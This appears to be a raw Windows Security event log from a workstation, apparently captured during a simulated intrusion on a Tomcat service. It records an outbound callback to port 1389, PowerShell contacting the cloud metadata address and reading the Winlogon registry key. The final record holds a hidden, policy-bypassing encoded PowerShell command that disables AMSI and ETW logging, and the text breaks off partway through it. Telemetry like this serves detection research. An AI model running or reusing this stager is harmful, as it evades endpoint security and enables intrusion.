{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:05.00Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessID\">3936</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\programdata\\chocolatey\\lib\\tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe</Data>\r\n  <Data Name=\"Direction\">%%14592</Data>\r\n  <Data Name=\"SourceAddress\">192.168.3.5</Data>\r\n  <Data Name=\"SourcePort\">50452</Data>\r\n  <Data Name=\"DestAddress\">192.168.2.5</Data>\r\n  <Data Name=\"DestPort\">8080</Data>\r\n  <Data Name=\"Protocol\">6</Data>\r\n  <Data Name=\"FilterRTID\">68996</Data>\r\n  <Data Name=\"LayerName\">%%14610</Data>\r\n  <Data Name=\"LayerRTID\">44</Data>\r\n  <Data Name=\"RemoteUserID\">S-1-0-0</Data>\r\n  <Data Name=\"RemoteMachineID\">S-1-0-0</Data>\r\n</EventData>", "EventID": 5156, "Activity": "5156 - The Windows Filtering Platform has allowed a connection.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:05.013Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessId\">7716</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"SourceAddress\">0.0.0.0</Data>\r\n  <Data Name=\"SourcePort\">54217</Data>\r\n  <Data Name=\"Protocol\">6</Data>\r\n  <Data Name=\"FilterRTID\">0</Data>\r\n  <Data Name=\"LayerName\">%%14608</Data>\r\n  <Data Name=\"LayerRTID\">36</Data>\r\n</EventData>", "EventID": 5158, "Activity": "5158 - The Windows Filtering Platform has permitted a bind to a local port.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:05.013Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessID\">7716</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"Direction\">%%14593</Data>\r\n  <Data Name=\"SourceAddress\">192.168.2.5</Data>\r\n  <Data Name=\"SourcePort\">54217</Data>\r\n  <Data Name=\"DestAddress\">169.254.169.254</Data>\r\n  <Data Name=\"DestPort\">80</Data>\r\n  <Data Name=\"Protocol\">6</Data>\r\n  <Data Name=\"FilterRTID\">69359</Data>\r\n  <Data Name=\"LayerName\">%%14611</Data>\r\n  <Data Name=\"LayerRTID\">48</Data>\r\n  <Data Name=\"RemoteUserID\">S-1-0-0</Data>\r\n  <Data Name=\"RemoteMachineID\">S-1-0-0</Data>\r\n</EventData>", "EventID": 5156, "Activity": "5156 - The Windows Filtering Platform has allowed a connection.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:05.653Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessId\">7716</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"SourceAddress\">0.0.0.0</Data>\r\n  <Data Name=\"SourcePort\">54223</Data>\r\n  <Data Name=\"Protocol\">6</Data>\r\n  <Data Name=\"FilterRTID\">0</Data>\r\n  <Data Name=\"LayerName\">%%14608</Data>\r\n  <Data Name=\"LayerRTID\">36</Data>\r\n</EventData>", "EventID": 5158, "Activity": "5158 - The Windows Filtering Platform has permitted a bind to a local port.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:05.653Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessID\">7716</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"Direction\">%%14593</Data>\r\n  <Data Name=\"SourceAddress\">192.168.2.5</Data>\r\n  <Data Name=\"SourcePort\">54223</Data>\r\n  <Data Name=\"DestAddress\">169.254.169.254</Data>\r\n  <Data Name=\"DestPort\">80</Data>\r\n  <Data Name=\"Protocol\">6</Data>\r\n  <Data Name=\"FilterRTID\">69359</Data>\r\n  <Data Name=\"LayerName\">%%14611</Data>\r\n  <Data Name=\"LayerRTID\">48</Data>\r\n  <Data Name=\"RemoteUserID\">S-1-0-0</Data>\r\n  <Data Name=\"RemoteMachineID\">S-1-0-0</Data>\r\n</EventData>", "EventID": 5156, "Activity": "5156 - The Windows Filtering Platform has allowed a connection.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:06.257Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessId\">2584</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\windows\\system32\\svchost.exe</Data>\r\n  <Data Name=\"SourceAddress\">::</Data>\r\n  <Data Name=\"SourcePort\">55121</Data>\r\n  <Data Name=\"Protocol\">17</Data>\r\n  <Data Name=\"FilterRTID\">0</Data>\r\n  <Data Name=\"LayerName\">%%14608</Data>\r\n  <Data Name=\"LayerRTID\">36</Data>\r\n</EventData>", "EventID": 5158, "Activity": "5158 - The Windows Filtering Platform has permitted a bind to a local port.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:06.257Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessId\">2584</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\windows\\system32\\svchost.exe</Data>\r\n  <Data Name=\"SourceAddress\">::</Data>\r\n  <Data Name=\"SourcePort\">55121</Data>\r\n  <Data Name=\"Protocol\">17</Data>\r\n  <Data Name=\"FilterRTID\">0</Data>\r\n  <Data Name=\"LayerName\">%%14608</Data>\r\n  <Data Name=\"LayerRTID\">38</Data>\r\n</EventData>", "EventID": 5158, "Activity": "5158 - The Windows Filtering Platform has permitted a bind to a local port.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:06.8Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessId\">3936</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\programdata\\chocolatey\\lib\\tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe</Data>\r\n  <Data Name=\"SourceAddress\">::</Data>\r\n  <Data Name=\"SourcePort\">54225</Data>\r\n  <Data Name=\"Protocol\">6</Data>\r\n  <Data Name=\"FilterRTID\">0</Data>\r\n  <Data Name=\"LayerName\">%%14608</Data>\r\n  <Data Name=\"LayerRTID\">36</Data>\r\n</EventData>", "EventID": 5158, "Activity": "5158 - The Windows Filtering Platform has permitted a bind to a local port.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:06.8Z", "SourceSystem": "OpsManager", "Account": "WORKGROUP\\WORKSTATION5$", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-18</Data>\r\n  <Data Name=\"SubjectUserName\">WORKSTATION5$</Data>\r\n  <Data Name=\"SubjectDomainName\">WORKGROUP</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e7</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Token</Data>\r\n  <Data Name=\"ObjectName\">-</Data>\r\n  <Data Name=\"HandleId\">0x79c</Data>\r\n  <Data Name=\"OldSd\">D:(A;;GA;;;SY)(A;;GA;;;LS)</Data>\r\n  <Data Name=\"NewSd\">D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-86-1544737700-199408000-2549878335-3519669259-381336952)</Data>\r\n  <Data Name=\"ProcessId\">0xc4c</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\svchost.exe</Data>\r\n</EventData>", "EventID": 4670, "Activity": "4670 - Permissions on an object were changed.", "HandleId": "0x79c", "ObjectName": "-", "ObjectServer": "Security", "ObjectType": "Token", "Process": "svchost.exe", "ProcessId": "0xc4c", "ProcessName": "C:\\Windows\\System32\\svchost.exe", "SubjectAccount": "WORKGROUP\\WORKSTATION5$", "SubjectDomainName": "WORKGROUP", "SubjectLogonId": "0x3e7", "SubjectUserName": "WORKSTATION5$", "SubjectUserSid": "S-1-5-18", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:06.8Z", "SourceSystem": "OpsManager", "Account": "WORKGROUP\\WORKSTATION5$", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-18</Data>\r\n  <Data Name=\"SubjectUserName\">WORKSTATION5$</Data>\r\n  <Data Name=\"SubjectDomainName\">WORKGROUP</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e7</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Token</Data>\r\n  <Data Name=\"ObjectName\">-</Data>\r\n  <Data Name=\"HandleId\">0x79c</Data>\r\n  <Data Name=\"OldSd\">D:(A;;GA;;;SY)(A;;GA;;;LS)</Data>\r\n  <Data Name=\"NewSd\">D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-86-1544737700-199408000-2549878335-3519669259-381336952)</Data>\r\n  <Data Name=\"ProcessId\">0xc4c</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\svchost.exe</Data>\r\n</EventData>", "EventID": 4670, "Activity": "4670 - Permissions on an object were changed.", "HandleId": "0x79c", "ObjectName": "-", "ObjectServer": "Security", "ObjectType": "Token", "Process": "svchost.exe", "ProcessId": "0xc4c", "ProcessName": "C:\\Windows\\System32\\svchost.exe", "SubjectAccount": "WORKGROUP\\WORKSTATION5$", "SubjectDomainName": "WORKGROUP", "SubjectLogonId": "0x3e7", "SubjectUserName": "WORKSTATION5$", "SubjectUserSid": "S-1-5-18", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:07.28Z", "SourceSystem": "OpsManager", "Account": "WORKGROUP\\WORKSTATION5$", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-18</Data>\r\n  <Data Name=\"SubjectUserName\">WORKSTATION5$</Data>\r\n  <Data Name=\"SubjectDomainName\">WORKGROUP</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e7</Data>\r\n  <Data Name=\"Status\">0x0</Data>\r\n  <Data Name=\"ProcessId\">0x1e24</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n</EventData>", "EventID": 4689, "Activity": "4689 - A process has exited.", "Process": "powershell.exe", "ProcessId": "0x1e24", "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "Status": "0x0", "SubjectAccount": "WORKGROUP\\WORKSTATION5$", "SubjectDomainName": "WORKGROUP", "SubjectLogonId": "0x3e7", "SubjectUserName": "WORKSTATION5$", "SubjectUserSid": "S-1-5-18", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:07.297Z", "SourceSystem": "OpsManager", "Account": "WORKGROUP\\WORKSTATION5$", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-18</Data>\r\n  <Data Name=\"SubjectUserName\">WORKSTATION5$</Data>\r\n  <Data Name=\"SubjectDomainName\">WORKGROUP</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e7</Data>\r\n  <Data Name=\"Status\">0x0</Data>\r\n  <Data Name=\"ProcessId\">0x2e94</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\conhost.exe</Data>\r\n</EventData>", "EventID": 4689, "Activity": "4689 - A process has exited.", "Process": "conhost.exe", "ProcessId": "0x2e94", "ProcessName": "C:\\Windows\\System32\\conhost.exe", "Status": "0x0", "SubjectAccount": "WORKGROUP\\WORKSTATION5$", "SubjectDomainName": "WORKGROUP", "SubjectLogonId": "0x3e7", "SubjectUserName": "WORKSTATION5$", "SubjectUserSid": "S-1-5-18", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:07.297Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-18</Data>\r\n  <Data Name=\"SubjectUserName\">WORKSTATION5$</Data>\r\n  <Data Name=\"SubjectDomainName\">WORKGROUP</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e7</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</Data>\r\n  <Data Name=\"HandleId\">0x844</Data>\r\n  <Data Name=\"TransactionId\">{00000000-0000-0000-0000-000000000000}</Data>\r\n  <Data Name=\"AccessList\">%%1538 \t\t\t\t%%4432 \t\t\t\t%%4435 \t\t\t\t%%4436 \t\t\t\t</Data>\r\n  <Data Name=\"AccessReason\">-</Data>\r\n  <Data Name=\"AccessMask\">0x20019</Data>\r\n  <Data Name=\"PrivilegeList\">-</Data>\r\n  <Data Name=\"RestrictedSidCount\">0</Data>\r\n  <Data Name=\"ProcessId\">0x1e24</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4656, "Activity": "4656 - A handle to an object was requested.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:07.297Z", "SourceSystem": "OpsManager", "Account": "WORKGROUP\\WORKSTATION5$", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"SubjectUserSid\">S-1-5-18</Data>\r\n  <Data Name=\"SubjectUserName\">WORKSTATION5$</Data>\r\n  <Data Name=\"SubjectDomainName\">WORKGROUP</Data>\r\n  <Data Name=\"SubjectLogonId\">0x3e7</Data>\r\n  <Data Name=\"ObjectServer\">Security</Data>\r\n  <Data Name=\"ObjectType\">Key</Data>\r\n  <Data Name=\"ObjectName\">\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</Data>\r\n  <Data Name=\"HandleId\">0x844</Data>\r\n  <Data Name=\"AccessList\">%%4432 \t\t\t\t</Data>\r\n  <Data Name=\"AccessMask\">0x1</Data>\r\n  <Data Name=\"ProcessId\">0x1e24</Data>\r\n  <Data Name=\"ProcessName\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\r\n  <Data Name=\"ResourceAttributes\">-</Data>\r\n</EventData>", "EventID": 4663, "Activity": "4663 - An attempt was made to access an object.", "AccessList": "%%4432 \t\t\t\t", "AccessMask": "0x1", "HandleId": "0x844", "ObjectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ObjectServer": "Security", "ObjectType": "Key", "Process": "powershell.exe", "ProcessId": "0x1e24", "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SubjectAccount": "WORKGROUP\\WORKSTATION5$", "SubjectDomainName": "WORKGROUP", "SubjectLogonId": "0x3e7", "SubjectUserName": "WORKSTATION5$", "SubjectUserSid": "S-1-5-18", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:07.297Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessId\">3936</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\programdata\\chocolatey\\lib\\tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe</Data>\r\n  <Data Name=\"SourceAddress\">::</Data>\r\n  <Data Name=\"SourcePort\">54225</Data>\r\n  <Data Name=\"Protocol\">6</Data>\r\n  <Data Name=\"FilterRTID\">0</Data>\r\n  <Data Name=\"LayerName\">%%14608</Data>\r\n  <Data Name=\"LayerRTID\">38</Data>\r\n</EventData>", "EventID": 5158, "Activity": "5158 - The Windows Filtering Platform has permitted a bind to a local port.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:07.297Z", "SourceSystem": "OpsManager", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventData": "<EventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\r\n  <Data Name=\"ProcessID\">3936</Data>\r\n  <Data Name=\"Application\">\\device\\harddiskvolume2\\programdata\\chocolatey\\lib\\tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe</Data>\r\n  <Data Name=\"Direction\">%%14593</Data>\r\n  <Data Name=\"SourceAddress\">192.168.2.5</Data>\r\n  <Data Name=\"SourcePort\">54225</Data>\r\n  <Data Name=\"DestAddress\">192.168.3.5</Data>\r\n  <Data Name=\"DestPort\">1389</Data>\r\n  <Data Name=\"Protocol\">6</Data>\r\n  <Data Name=\"FilterRTID\">69359</Data>\r\n  <Data Name=\"LayerName\">%%14611</Data>\r\n  <Data Name=\"LayerRTID\">48</Data>\r\n  <Data Name=\"RemoteUserID\">S-1-0-0</Data>\r\n  <Data Name=\"RemoteMachineID\">S-1-0-0</Data>\r\n</EventData>", "EventID": 5156, "Activity": "5156 - The Windows Filtering Platform has allowed a connection.", "SourceComputerId": "29acc230-2f13-49db-9ef2-c9b20229a10d", "EventOriginId": "29acc230-2f13-49db-9ef2-c9b20229a10c", "MG": "00000000-0000-0000-0000-000000000001", "TimeCollected": "2025-09-12T08:54:37.935Z", "ManagementGroupName": "AOI-redacted", "Type": "SecurityEvent", "_ResourceId": "/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId": "redacted", "TimeGenerated": "2025-09-12T08:54:08.21Z", "SourceSystem": "OpsManager", "Account": "NT AUTHORITY\\LOCAL SERVICE", "AccountType": "Machine", "Computer": "WORKSTATION5", "EventSourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", "Task": 1, "Level": "0", "EventID": 4688, "Activity": "4688 - A new process has been created.", "CommandLine": "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAH